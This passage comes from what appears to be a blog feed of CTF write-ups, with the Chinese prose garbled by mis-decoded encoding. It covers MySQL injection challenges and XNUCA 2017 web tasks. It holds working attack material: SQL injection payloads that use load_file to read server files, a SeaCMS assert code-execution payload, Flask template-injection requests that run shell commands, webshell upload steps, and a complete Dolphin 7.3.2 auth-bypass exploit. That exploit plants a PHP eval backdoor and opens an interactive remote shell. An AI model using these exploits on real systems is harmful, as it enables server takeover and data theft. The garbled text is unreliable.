<p>å®½å­—èŠ‚æ³¨å…¥æ˜¯åˆ©ç”¨mysqlçš„ä¸€ä¸ªç‰¹æ€§ï¼Œmysqlåœ¨ä½¿ç”¨GBKç¼–ç çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦æ˜¯ä¸€ä¸ªæ±‰å­—ï¼ˆå‰ä¸€ä¸ªasciiç è¦å¤§äº128ï¼Œæ‰åˆ°æ±‰å­—çš„èŒƒå›´ï¼‰ã€‚å¦‚æœæˆ‘ä»¬è¾“å…¥%dfâ€™çœ‹ä¼šæ€æ ·ï¼šæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå·²ç»æŠ¥é”™äº†ã€‚æˆ‘ä»¬çœ‹åˆ°æŠ¥é”™ï¼Œè¯´æ˜sqlè¯­å¥å‡ºé”™ï¼Œçœ‹åˆ°å‡ºé”™è¯´æ˜å¯ä»¥æ³¨å…¥äº†ã€‚</p>
<p>ä¸ºä»€ä¹ˆä»åˆšæ‰åˆ°ç°åœ¨ï¼Œåªæ˜¯åœ¨â€™ä¹Ÿå°±æ˜¯%27å‰é¢åŠ äº†ä¸€ä¸ª%dfå°±æŠ¥é”™äº†ï¼Ÿè€Œä¸”ä»å›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼ŒæŠ¥é”™çš„åŸå› å°±æ˜¯å¤šäº†ä¸€ä¸ªå•å¼•å·ï¼Œè€Œå•å¼•å·å‰é¢çš„åæ–œæ ä¸è§äº†ã€‚</p>
<p>è¿™å°±æ˜¯mysqlçš„ç‰¹æ€§ï¼Œå› ä¸ºgbkæ˜¯å¤šå­—èŠ‚ç¼–ç ï¼Œä»–è®¤ä¸ºä¸¤ä¸ªå­—èŠ‚ä»£è¡¨ä¸€ä¸ªæ±‰å­—ï¼Œæ‰€ä»¥%dfå’Œåé¢çš„\ä¹Ÿå°±æ˜¯%5cå˜æˆäº†ä¸€ä¸ªæ±‰å­—â€œé‹â€ï¼Œè€Œâ€™é€ƒé€¸äº†å‡ºæ¥ã€‚</p>
</blockquote>
</blockquote>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170402/014329429.png" alt="mark"></p>
<p>â€‹    æ‰¾åˆ°æ³¨å…¥ç‚¹äº†ï¼Œorder by è¯•å‡ºæœ‰2ä¸ªå­—æ®µã€‚</p>
<p>â€‹    union æŸ¥è¯¢çˆ†æ•°æ®åº“ã€‚ä»¥ä¸ºå¯ä»¥ä¸€å¥—å‡ºï¼Œç»“æœã€‚å®ƒã€‚æŠ¥ã€‚é”™ã€‚äº†ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170402/014712950.png" alt="mark"></p>
<p>â€‹    ç„¶åå†åŠ ä¸Šæ³¨é‡Šç¬¦ã€‚è¿™æ ·å¯ä»¥æ³¨é‡Šæ‰åé¢çš„sqlè¯­å¥ï¼Œç„¶åè®©å…¶åªæ‰§è¡Œæ”»å‡»è¯­å¥è€Œè¾¾åˆ°ç›®çš„ã€‚</p>
<p>â€‹    ç»§ç»­ã€‚æŸ¥è¯¢æ•°æ®åº“ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170403/151814239.png" alt="mark"></p>
<p>â€‹    å¾—åˆ°sql5çš„åº“ï¼Œç»§ç»­ï¼ŒæŸ¥è¡¨ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170403/151951812.png" alt="mark"></p>
<p>â€‹    å¿«å¥½äº†ï¼Œé©¬ä¸Šå°±å¥½äº†ã€‚å†æŸ¥è¯¢keyè¡¨çš„å­—æ®µã€‚</p>
<p>â€‹    <img src="http://omfp4wyym.bkt.clouddn.com/blog/20170403/180547109.png" alt="mark"></p>
<p>â€‹    æ³¨æ„åˆ°è¡¨åç”¨äº†asciiç ï¼Œå› ä¸ºç”¨â€™keyâ€™æ—¶<code>&#39;&#39;</code>è¢«è½¬ä¹‰äº†ã€‚</p>
<p>â€‹    æœ€åä»keyè¡¨æŸ¥è¯¢ï¼Œè¿™é‡ŒæŸ¥è¯¢æ—¶keyè¡¨ç›´æ¥è¾“å…¥æœ‰é—®é¢˜ï¼Œè¯•äº†è¯•å…¶ä»–å­—ç¬¦éƒ½å¯ä»¥ï¼Œåº”è¯¥æ˜¯æœ‰è¿‡æ»¤ã€‚</p>
<p>â€‹    <img src="http://omfp4wyym.bkt.clouddn.com/blog/20170404/160042687.png" alt="mark"></p>
<p>â€‹    è¿™é‡Œä¸æ–­çš„è¯•ï¼Œå‘ç°æœ‰ä¸€ä¸ªç‚¹æ¥è¿æ¥ï¼Œé«˜æ¶µè¡¨å“¥å‘ç°.keyå¯ä»¥æ‰§è¡Œã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170404/160200325.png" alt="mark"></p>
<p>â€‹    è¿™é‡Œ`key`ä¹Ÿå¯ä»¥ç»•è¿‡ã€‚</p>
<p>â€‹    æœ€åã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170403/181034762.png" alt="mark"></p>
<p>â€‹    aaaaaaaaaa</p>
<h2 id="sql-2-103-238-227-13-10084"><a href="#sql-2-103-238-227-13-10084" class="headerlink" title="sql-2(103.238.227.13:10084)"></a>sql-2(103.238.227.13:10084)</h2><pre><code>http://103.238.227.13:10084/?id=-1+anD Updatexml(1,concat(0x7e,(SELEcT @@veRsion),0x7e),1)   --+</code></pre>
<p>â€‹    updatexmlçš„çˆ†é”™åŸå› æ˜¯updatexmlç¬¬äºŒä¸ªå‚æ•°éœ€è¦çš„æ˜¯Xpathæ ¼å¼çš„å­—ç¬¦ä¸²ã€‚æˆ‘ä»¬è¾“å…¥çš„æ˜¾ç„¶ä¸ç¬¦åˆã€‚æ•…æŠ¥é”™ç”±æ­¤æŠ¥é”™ã€‚</p>
<p>â€‹    ä½†updatexmlçš„æœ€å¤§é•¿åº¦æ˜¯32ä½çš„ï¼Œæ‰€ä»¥æœ‰æ‰€å±€é™ï¼ˆPSï¼šä½†æ˜¯åº”å¯¹å¤§å¤šçš„å·²ç»è¶³å¤Ÿã€‚ï¼‰</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170403/181525952.png" alt="mark">    </p>
<p>â€‹    æ•°æ®åº“ç‰ˆæœ¬ï¼š5.5.48-log</p>
<h2 id="sql-3-103-238-227-13-10087"><a href="#sql-3-103-238-227-13-10087" class="headerlink" title="sql-3(103.238.227.13:10087)"></a>sql-3(103.238.227.13:10087)</h2><pre><code>http://103.238.227.13:10087/?id=1 u%00nion sel%00ect GROUP_CONCAT(hash),1 fr%00om .key --+</code></pre>
<p>â€‹    æç¤ºç»™å‡ºäº†éƒ¨åˆ†æºç ï¼Œå¯ä»¥çœ‹å‡ºå¯¹è¿™ä¹ˆå¤šæŸ¥è¯¢è¯­å¥éƒ½è¿›è¡Œäº†è¿‡æ»¤ï¼Œè€Œæ±‚å¤§å°å†™ä¹Ÿä¸ç®¡ç”¨ï¼Œä¼šè½¬æ¢åæ¯”å¯¹ã€‚</p>
<p>â€‹    %00 phpå’Œmysqlå¯¹äºå…¶çš„å¤„ç†ä¸åŒï¼ŒPHPä¼šå¯¹å…¶è¿›è¡Œè§£ç ï¼Œè€Œmysqlä¼šå¿½ç•¥ï¼Œè¿™æ ·æ—¢ç»•è¿‡äº†è¿‡æ»¤ï¼Œåˆä¸å½±å“sqlè¯­å¥çš„æ‰§è¡Œã€‚</p>
<p>â€‹    æ­¥éª¤å’Œç¬¬ä¸€ä¸ªå·®ä¸å¤šï¼Œç›´æ¥æŸ¥è¯¢å°±å¥½ã€‚</p>
<p>â€‹    è¿™é‡ŒæŸ¥è¯¢æ—¶keyè¡¨ç›´æ¥è¾“å…¥æœ‰é—®é¢˜ï¼Œè¯•äº†è¯•å…¶ä»–å­—ç¬¦éƒ½å¯ä»¥ï¼Œåº”è¯¥æ˜¯æœ‰è¿‡æ»¤ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170404/155449465.png" alt="mark"></p>
<p>â€‹        åŒ1</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170403/185603966.png" alt="mark"></p>
<p>â€‹    è¿”å›1~c3d3c17b4ca7f791f85e#$1cc72af274af4adef</p>
<h2 id="sql-4-103-238-227-13-10088"><a href="#sql-4-103-238-227-13-10088" class="headerlink" title="sql-4(103.238.227.13:10088)"></a>sql-4(103.238.227.13:10088)</h2><p>â€‹    é™åˆ¶äº†ç©ºæ ¼ï¼Œå¯ä»¥åˆ©ç”¨æ³¨é‡Š/**/ä»£æ›¿ç©ºæ ¼ï¼Œä¹Ÿå¯ä»¥ç”¨%0.</p>
<p>â€‹    æš´é”™æ³¨å…¥ï¼Œä¹‹å‰updatexmlå‡½æ•°æŠ¥é”™æ³¨å…¥å¯ä»¥ï¼Œè¿™é‡Œä¹Ÿåˆ©ç”¨çš„updatexml()å‡½æ•°æš´é”™ï¼ŒExtractValue()ä¹Ÿå¯ä»¥ï¼Œè¿”å›çš„æ•°æ®åŒæ ·æœ‰é™ï¼Œæœ€é•¿32ä½ï¼Œä½†å¯ä»¥åˆ†æ‰¹æ¬¡æå–ã€‚</p>
<pre><code>
http://103.238.227.13:10088/?id=-1/**/and/**/updatexml(1,concat(0x7e,(SELECT@@version),0x7e),1)
</code></pre>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170404/163203172.png" alt="mark"></p>
<pre><code>http://103.238.227.13:10088/?id=-1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/load_file(0x2f7661722f746573742f6b65795f312e706870)),0x7e),1)</code></pre>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170404/163503756.png" alt="mark"></p>
<pre><code>http://103.238.227.13:10088/?id=1%0aand%0aupdatexml(1,concat(0x7e,(select%0a(substring(load_file(0x2f7661722f746573742f6b65795f312e706870),64,32))),0x7e),1)</code></pre>
<pre><code>http://103.238.227.13:10088/?id=1%0aand%0aupdatexml(1,concat(0x7e,(select%0a(substring(load_file(0x2f7661722f746573742f6b65795f312e706870),95,32))),0x7e),1)</code></pre>
<p>â€‹    åˆ†2æ¬¡è¯»å–å†æ‹¼æ¥ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170404/163757467.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170404/163850106.png" alt="mark"></p>
<p>å¾—åˆ°Flag:â€7249f5a7fd1de602b30e6f39aea6193aâ€</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>XNUCA-WriteUp</title>
    <url>/2017/09/04/xnuca-2017/</url>
    <content><![CDATA[<h1 id="XNUCA-2017"><a href="#XNUCA-2017" class="headerlink" title="XNUCA-2017"></a>XNUCA-2017</h1><blockquote>
<p>ç¬¬ä¸€æœŸWriteUp            </p>
</blockquote>
<p>â€‹                            <strong>â€”â€”By TK-å¥½åå­—</strong></p>
<h2 id="No-1-ä½ å–œæ¬¢é¢œæ–‡å­—ä¹ˆ"><a href="#No-1-ä½ å–œæ¬¢é¢œæ–‡å­—ä¹ˆ" class="headerlink" title="No.1 ä½ å–œæ¬¢é¢œæ–‡å­—ä¹ˆ"></a>No.1 ä½ å–œæ¬¢é¢œæ–‡å­—ä¹ˆ</h2><p>ç‚¹å‡»é‡ç½®å¯†ç ï¼Œè¿›å…¥ä¸€ä¸ªç•Œé¢</p>
<p><img src="http://osn75zd5c.bkt.clouddn.com/2017%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E5%AE%89%E8%81%94%E8%B5%9B-%E4%BD%A0%E5%96%9C%E6%AC%A2%E9%A2%9C%E6%96%87%E5%AD%97%E4%B9%881.png"></p>
<p>ç”¨æˆ·åå¡«admin å®‰å…¨é—®é¢˜ç­”æ¡ˆå¡« ä¸å–œæ¬¢ï¼Œç›´æ¥æäº¤å³å¯è·å¾—flag</p>
<h2 id="No-2-è®©ä½ æ— è¯­çš„md5"><a href="#No-2-è®©ä½ æ— è¯­çš„md5" class="headerlink" title="No.2 è®©ä½ æ— è¯­çš„md5"></a>No.2 è®©ä½ æ— è¯­çš„md5</h2><p>å³é”®æŸ¥çœ‹æºä»£ç æœ‰æç¤º</p>
<pre><code>&lt;!--pav1å’Œlloowweerrxxç»å¸¸å› ä¸ºç”¨åŒä¸€ä¸ªè´¦å·è€Œåµèµ·æ¥--&gt;
&lt;!--pav1å»ºæ•°æ®åº“å–œæ¬¢ç”¨é»˜è®¤çš„latin1ï¼Œlloowweerrxxå†™ç¨‹åºçš„æ—¶å€™setäº†ä¸€ä¸‹utf8,ä»–ä»¬å¥½åƒåˆåµèµ·æ¥å•¦--&gt;</code></pre>
<p>å¯å‚è€ƒ</p>
<blockquote>
<p><a href="http://www.freebuf.com/articles/web/124537.html">http://www.freebuf.com/articles/web/124537.html</a><br>åœ¨æŸ¥è¯¢æ ä¸­ç›´æ¥è¾“å…¥adminä¸è¡Œï¼Œè¦è¾“å…¥ã€</p>
</blockquote>
<pre><code>admin                          ï¼ˆåé¢è·Ÿä¸€å¤§ä¸²ç©ºæ ¼ï¼‰</code></pre>
<p>ç„¶åä¼šæç¤º<br>â€‹    </p>
<pre><code>16714f297ee17b13a097a15cd229c947è¿™ä¸ªMD5æœ‰ç‚¹ä¸åŒå•Šï¼Œå¿«å»somd5ä¸€ä¸‹ï¼</code></pre>
<p>ç™¾åº¦ä¸€ä¸‹ æ— è¯­çš„md5,å»è¿™ä¸ªç½‘ç«™ç›´æ¥æŸ¥è¯¢</p>
<pre><code>https://www.somd5.com/</code></pre>
<p>è·å¾—flag</p>
<h2 id="NO-3-Pav1å’Œlloowweerrxx-avi"><a href="#NO-3-Pav1å’Œlloowweerrxx-avi" class="headerlink" title="NO.3 Pav1å’Œlloowweerrxx.avi"></a>NO.3 Pav1å’Œlloowweerrxx.avi</h2><p>è¯¥é¢˜åˆ©ç”¨çš„FFmpegçš„ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œåˆ©ç”¨æ–¹å¼å¯å‚è€ƒ</p>
<blockquote>
<p><a href="http://www.freebuf.com/vuls/138377.html">http://www.freebuf.com/vuls/138377.html</a></p>
</blockquote>
<p>ä¸‹è½½è„šæœ¬ï¼Œç›´æ¥æ‰§è¡Œ</p>
<pre><code>python3 attack.py file:///home/user/flag sxcurity.mp4</code></pre>
<p>å°†ç”Ÿæˆçš„sxcurity.mp4ç›´æ¥ä¸Šä¼ ï¼Œä¼šè·³è½¬åˆ°download.phpä¸‹è½½ï¼Œä¹‹åè·å¾—ä¸€ä¸ªè§†é¢‘æ–‡ä»¶ï¼Œç›´æ¥æ’­æ”¾ï¼Œå‰å‡ å¸§ä¸­æœ‰flag</p>
<p><img src="http://osn75zd5c.bkt.clouddn.com/2017%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E5%AE%89%E8%81%94%E8%B5%9B-Pav1%E5%92%8Clloowweerrxx.avi-1.png"></p>
<h2 id="No-5æ„‰å¿«çš„ç©è€å§"><a href="#No-5æ„‰å¿«çš„ç©è€å§" class="headerlink" title="No.5æ„‰å¿«çš„ç©è€å§"></a>No.5æ„‰å¿«çš„ç©è€å§</h2><p>è®¿é—®</p>
<pre><code>/admin/login/login_check.php?met_cookie_filter[a]=a%27,admin_pass=md5(1234567)+where+id=1;+%23--</code></pre>
<p>å°†adminå¯†ç æ”¹ä¸ºäº†1234567</p>
<p>ç™»é™†åå°</p>
<pre><code>user:admin
password:1234567</code></pre>
<p>æ›´æ”¹ç½‘ç«™é…ç½®</p>
<pre><code>å°†ä¸Šä¼ æ–‡ä»¶é‡å‘½åæ”¹ä¸ºä¸å‹¾é€‰
å°†å…è®¸ä¸Šä¼ æ–‡ä»¶æ ¼å¼æ·»åŠ PHPä¸PHP5</code></pre>
<p>å‘å¸ƒâ€“&gt;ä¸‹è½½â€”&gt;æ–‡ä»¶æˆ–è½¯ä»¶â€“&gt;é€‰æ‹©æ–‡ä»¶ä¸Šä¼ </p>
<p>ä¼ å…¥php5å¤§é©¬ï¼Œå›æ˜¾è·¯å¾„ï¼Œç›´æ¥è®¿é—®ã€‚</p>
<p>æ‰¾åˆ°flagå¹¶æ·»åŠ æ–‡ä»¶ã€‚</p>
<p>æˆªå›¾:</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170826/213236811.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170826/213335213.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170826/213345685.png" alt="mark"></p>
<h2 id="No-8-çœ‹è§†é¢‘çœŸå—¨çš®ï¼ˆè¯»ï¼š50åˆ†ï¼Œå†™ï¼š100åˆ†ï¼‰"><a href="#No-8-çœ‹è§†é¢‘çœŸå—¨çš®ï¼ˆè¯»ï¼š50åˆ†ï¼Œå†™ï¼š100åˆ†ï¼‰" class="headerlink" title="No.8 çœ‹è§†é¢‘çœŸå—¨çš®ï¼ˆè¯»ï¼š50åˆ†ï¼Œå†™ï¼š100åˆ†ï¼‰"></a>No.8 çœ‹è§†é¢‘çœŸå—¨çš®ï¼ˆè¯»ï¼š50åˆ†ï¼Œå†™ï¼š100åˆ†ï¼‰</h2><pre><code>æäº¤
å…³é”®å­—è¯ï¼šä¸€æ¡£é¶æ ‡é¢˜
===============================================================
å‘¨æœ«çœ‹ä¸ªç”µå½±æ”¾æ¾ä¸€ä¸‹å§ï¼</code></pre>
<p><a href="http://0day5.com/archives/4249/">æµ·æ´‹cms v6.45å‰å°getshellæ¼æ´</a></p>
<p>payloadï¼š</p>
<pre><code>urlï¼šhttp://6f781364dedf5dc1eb877079f415877b.xnuca.cn/search.php?searchtype=5&amp;tid=0&amp;year=23334444);assert($_POST[1]);//
post:searchword=d&amp;order=&#125;&#123;end if&#125;&#123;if:1)print_r($_POST[func]($_POST[cmd]));//&#125;&#123;end if&#125;&amp;func=assert&amp;cmd=phpinfo();</code></pre>
<p>phpinfo()æ­£å¸¸æ‰§è¡Œã€‚</p>
<p>é€šè¿‡systemå‡½æ•°æ‰§è¡Œå‘½ä»¤ã€‚<br><img src="https://github.com/Windylh/image/raw/master/2017.8.26/hycms0.png" alt="1"><br>æ‰¾flagä½ç½®<br><img src="https://github.com/Windylh/image/raw/master/2017.8.26/hycms1.png" alt="2"><br>æŸ¥è¯¢flag<br><img src="https://github.com/Windylh/image/raw/master/2017.8.26/hycms2.png" alt="3"><br>åˆ›å»ºæ–‡ä»¶<br><img src="https://github.com/Windylh/image/raw/master/2017.8.26/hycms3.png" alt="4"></p>
<h2 id="NO-9-The-Best-Community"><a href="#NO-9-The-Best-Community" class="headerlink" title="NO.9 The Best Community"></a>NO.9 The Best Community</h2><p>Dolphin &lt;= 7.3.2 ç»•è¿‡éªŒè¯ + è¿œç¨‹ä»£ç æ‰§è¡Œ</p>
<p>ç›´æ¥åˆ©ç”¨è„šæœ¬:</p>
<pre><code>#!/usr/bin/env python
# -*- coding: utf-8 -*-
&#39;&#39;&#39;
Software : Dolphin &lt;= 7.3.2 Auth bypass / RCE exploit
Vendor : www.boonex.com
Author : Ahmed sultan (0x4148)
Home : 0x4148.com | https://www.linkedin.com/in/0x4148
Email : 0x4148@gmail.com
Auth bypass trick credit go to Saadat Ullah
&#39;&#39;&#39;
import os
import sys
import urllib
import urllib2
import ssl
import base64
print &quot;[+] Dolphin &lt;= 7.3.2 Auth bypass / RCE exploit&quot;
print &quot;[+] Author : Ahmed sultan (0x4148)&quot;
print &quot;[+] Home : 0x4148.com\n&quot;
if len(sys.argv)&lt;2:
    print &quot;\nUsage : python &quot;+sys.argv[0]+&quot; http://HOST/path/\n&quot;
    sys.exit();
hosturl=sys.argv[1]
fields = &#123;&#39;csrf_token&#39;: &#39;Aint give a shit about csrf stuff ;)&#39;, &#39;submit_upload&#39;: &#39;0x4148&#39;&#125;
gcontext = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
def generate_http_request(fields):
    lmt = &#39;---------------------------&#39;
    crlf = &#39;\r\n&#39;
    x4148mltprt = []
    x4148mltprt.append(&#39;--&#39; + lmt)
    if fields:
        for (key, value) in fields.items():
            x4148mltprt.append(&#39;Content-Disposition: form-data; name=&quot;%s&quot;&#39; % key)
            x4148mltprt.append(&#39;&#39;)
            x4148mltprt.append(value)
            x4148mltprt.append(&#39;--&#39; + lmt)
    x4148mltprt.append(&#39;Content-Disposition: form-data; name=&quot;module&quot;; filename=&quot;0x4148.zip&quot;&#39;)
    x4148mltprt.append(&#39;Content-Type: application/zip&#39;)
    x4148mltprt.append(&#39;&#39;)
    x4148mltprt.append(&quot;PK\x03\x04\x0a\x00\x00\x00\x00\x00RanIj\xf0\xfdU1\x00\x00\x001\x00\x00\x00\x0c\x00\x00\x000x4148fo.php&quot;
    &quot;&lt;?php\x0d\x0aeval(base64_decode($_POST[\&#39;0x4148\&#39;]));\x0d\x0a?&gt;PK\x01\x02\x14\x00\x0a\x00\x00\x00\x00\x00RanIj&quot;
    &quot;\xf0\xfdU1\x00\x00\x001\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x01\x00 \x00\x00\x00\x00\x00\x00\x000x4148fo.php&quot;
    &quot;PK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00:\x00\x00\x00[\x00\x00\x00\x00\x00&quot;)
    x4148mltprt.append(&#39;--&#39; + lmt + &#39;--&#39;)
    x4148mltprt.append(&#39;&#39;)
    body = crlf.join(x4148mltprt)
    content_type = &#39;multipart/form-data; boundary=%s&#39; % (lmt)
    return content_type, body
content_type, body = generate_http_request(fields)
print &quot; + Sending payload to &quot;+hosturl.split(&quot;//&quot;)[1].split(&quot;/&quot;)[0]
req = urllib2.Request(hosturl+&quot;/administration/modules.php&quot;,body)
req.add_header(&#39;User-agent&#39;, &#39;Mozilla 15&#39;)

req.add_header(&quot;Cookie&quot;, &quot;memberID=1; memberPassword[]=0x4148;&quot;)
req.add_header(&#39;Referer&#39;, hosturl+&quot;/administration/modules.php&quot;)
req.add_header(&#39;Content-Type&#39;, content_type)
req.add_header(&#39;Content-Length&#39;, str(len(body)))
req.add_header(&#39;Accept&#39;, &#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#39;)
try:
    urllib2.urlopen(req,context=gcontext).read()
except urllib2.HTTPError, e:
    err=e.fp.read()
    print err
    sys.exit()
print &quot; * Checking if payload was send&quot;
data = urllib.urlencode(&#123;&#39;0x4148&#39;:&#39;echo &quot;0x4148foooo&quot;;&#39;.encode(&#39;base64&#39;)&#125;)
req = urllib2.Request(hosturl+&#39;/tmp/0x4148fo.php&#39;, data)
if urllib2.urlopen(req).read().find(&quot;0x4148foooo&quot;)==-1:
    print &quot; - Exploitation failed&quot;
    print req
    sys.exit()
print &quot; + php prompt up and running\n + type &#39;shell&#39; to get shell access&quot;
while True:
    request=str(raw_input(&quot;\nphp&gt;&gt; &quot;))
    if request==&quot;exit&quot;:
        sys.exit()
    if request==&quot;shell&quot; or request==&quot;cmd&quot;:
        print &quot;\n + Switched to Shell mode\n + Type &#39;return&#39; to return to php prompt mode&quot;
        while True:
            cmd=str(raw_input(&quot;\n0x4148@&quot;+hosturl.split(&quot;//&quot;)[1].split(&quot;/&quot;)[0]+&quot;# &quot;))
            if cmd==&quot;return&quot;:
                break
            if cmd==&quot;exit&quot;:
                sys.exit()
            kkk=&quot;passthru(&#39;&quot;+cmd+&quot;&#39;);&quot;
            data = urllib.urlencode(&#123;&#39;0x4148&#39;:kkk.encode(&#39;base64&#39;)&#125;)
            req = urllib2.Request(hosturl+&#39;/tmp/0x4148fo.php&#39;, data)
            print urllib2.urlopen(req).read()
    data = urllib.urlencode(&#123;&#39;0x4148&#39;:request.encode(&#39;base64&#39;)&#125;)
    req = urllib2.Request(hosturl+&#39;/tmp/0x4148fo.php&#39;, data)
    print urllib2.urlopen(req).read()</code></pre>
<h2 id="No-11-ä¸¤åªå°èœœèœ‚å•Š"><a href="#No-11-ä¸¤åªå°èœœèœ‚å•Š" class="headerlink" title="No.11 ä¸¤åªå°èœœèœ‚å•Š"></a>No.11 ä¸¤åªå°èœœèœ‚å•Š</h2><p>ç›´æ¥åå°å¼±å£ä»¤</p>
<pre><code>http://6b4d6f19e2505e939db9fe549355dffd.xnuca.cn/admin/admin.php</code></pre>
<pre><code>username: admin
passwordï¼šadmin</code></pre>
<p>æŸ¥èµ„æ–™å¯çŸ¥æœ‰æ–‡ä»¶ä¸Šä¼ æ¼æ´</p>
<p><img src="http://osn75zd5c.bkt.clouddn.com/2017%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E5%AE%89%E8%81%94%E8%B5%9B-no.11.png"></p>
<p>æœåŠ¡å™¨åªæ£€æŸ¥äº†</p>
<pre><code>Content-Type: image/jpeg</code></pre>
<p>ç„¶åå°±å°†ä¸Šä¼ åŸæ–‡ä»¶çš„æ‰©å±•åæ‹¼æ¥åˆ°æœåŠ¡å™¨çš„æ–°æ–‡ä»¶ä¸­ï¼Œç„¶åè¿”å›äº†è·¯å¾„</p>
<pre><code>img/201708261744154724.php</code></pre>
<p>ç”±äºæœ‰360ç½‘ç«™å«å£«ï¼Œå› æ­¤ä¸Šä¼ ä¸€ä¸ªå…æ€ä¸€å¥è¯ï¼Œç„¶åç”¨èœåˆ€è¿æ¥</p>
<pre><code>http://41ff54ee00cc234605b67f6442c5a7e7.xnuca.cn/upload/img/201708261842507460.php</code></pre>
<p>è¿æ¥åç›´æ¥ç»ˆç«¯æ‰§è¡Œå‘½ä»¤</p>
<pre><code>[/var/www/html/upload/img/]$ whereis flag
flag: /etc/flag.txt</code></pre>
<p>è·å¾—è¯»çš„flagï¼Œç„¶ååœ¨æŒ‰ç…§è¦æ±‚ä¸Šä¼ æŒ‡å®šæ–‡ä»¶ååˆ°writeHereç›®å½•ä¸‹ã€‚<br>å³å¯è·å¾—è¯»å’Œå†™çš„å…¨éƒ¨åˆ†æ•°</p>
<h2 id="NO-16-æ¥ä¸€å‘flask"><a href="#NO-16-æ¥ä¸€å‘flask" class="headerlink" title="NO.16 æ¥ä¸€å‘flask"></a>NO.16 æ¥ä¸€å‘flask</h2><p>Flaskçš„SQLæ³¨å…¥ï¼Œç”±äºæ²¡æ³•ç›´æ¥æµè§ˆå™¨å†…ä¿®æ”¹æ•°æ®ï¼Œæ‰€ä»¥ç”¨BurpsuiteæŠ“åŒ…ä¿®æ”¹</p>
<p>Thx to <a href="https://github.com/73696e65">@73696e65</a></p>
<pre><code>GET /&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]('/etc/flag.txt').read()&#125;&#125; HTTP/1.1

GET /&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg','w').write('from%20subprocess%20import%20check_output\n\nRUNCMD%20=%20check_output\n')&#125;&#125; HTTP/1.1

GET /&#123;&#123;config.from_pyfile('/tmp/owned.cfg')&#125;&#125; HTTP/1.1

GET /&#123;&#123;config['RUNCMD']('locate writeHere',shell=True)&#125;&#125; HTTP/1.1

GET /&#123;&#123;config['RUNCMD']('touch /../../.........',shell=True)&#125;&#125; HTTP/1.1</code></pre>
<h2 id="NO-21-Freecms"><a href="#NO-21-Freecms" class="headerlink" title="NO.21 Freecms"></a>NO.21 Freecms</h2><p>ä¸‹è½½freecms-1.4çš„æºç ï¼ŒæŸ¥çœ‹åå‘ç°å­˜åœ¨Struts2-045çš„æ¼æ´ï¼Œåˆ©ç”¨ç°æˆå·¥å…·</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170826/221220165.png" alt="mark"></p>
<h2 id="No-23-æ‰¾å…¥å£ï¼ˆè¯»ï¼š100åˆ†ï¼Œå†™ï¼š200åˆ†ï¼‰"><a href="#No-23-æ‰¾å…¥å£ï¼ˆè¯»ï¼š100åˆ†ï¼Œå†™ï¼š200åˆ†ï¼‰" class="headerlink" title="No.23 æ‰¾å…¥å£ï¼ˆè¯»ï¼š100åˆ†ï¼Œå†™ï¼š200åˆ†ï¼‰"></a>No.23 æ‰¾å…¥å£ï¼ˆè¯»ï¼š100åˆ†ï¼Œå†™ï¼š200åˆ†ï¼‰</h2><pre><code>æäº¤
å…³é”®å­—è¯ï¼šäºŒæ¡£é¶æ ‡é¢˜
===============================================================
æœ¬ç«™çš„åŸºæœ¬èŒèƒ½æ˜¯ä»€ä¹ˆ</code></pre>
<p>æ‰¾åˆ°ç½‘ç«™åå°ï¼Œå‘ç°åå°æ˜¯å¼±å£ä»¤<code>username=admin&amp;password=admin</code>ã€‚</p>
<p><a href="http://www.freebuf.com/articles/web/138640.html">wolfcms ä»»æ„æ–‡ä»¶ä¸Šä¼ </a></p>
<p>åå°ç›´æ¥ä¸Šä¼ shellï¼Œæ ¹æ®å‰å°çš„logoæ‰¾åˆ°å¯¹åº”çš„è·¯å¾„ã€‚</p>
<p>æŒ‰ç…§ä¸Šä¸€é¢˜çš„å¥—è·¯æŸ¥çœ‹flagï¼Œå†™æ–‡ä»¶ã€‚<br><img src="https://github.com/Windylh/image/raw/master/2017.8.26/zrk1.png" alt="5"><br><img src="https://github.com/Windylh/image/raw/master/2017.8.26/zrk2.png" alt="6"></p>
]]></content>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS</title>
    <url>/2017/03/11/xss/</url>
